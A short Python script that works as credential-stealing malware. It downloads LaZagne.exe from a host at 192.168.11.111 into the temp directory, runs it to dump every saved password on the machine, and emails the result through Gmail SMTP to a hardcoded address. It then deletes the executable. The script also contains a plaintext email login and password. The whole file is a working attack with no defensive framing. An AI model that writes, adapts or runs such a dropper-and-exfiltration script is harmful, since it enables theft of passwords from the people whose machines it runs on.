#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_email(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir() # file will be downloadedi in the temp directory
os.chdir(temp_directory)

download("http://192.168.11.111/files/LaZagne.exe")
result =  subprocess.check_output(["LaZagne.exe", "all"], shell=True)
print(result) # remove after testing
send_email("batman99q@gmail.com", "qwerty&234", result)
os.remove("LaZagne.exe")
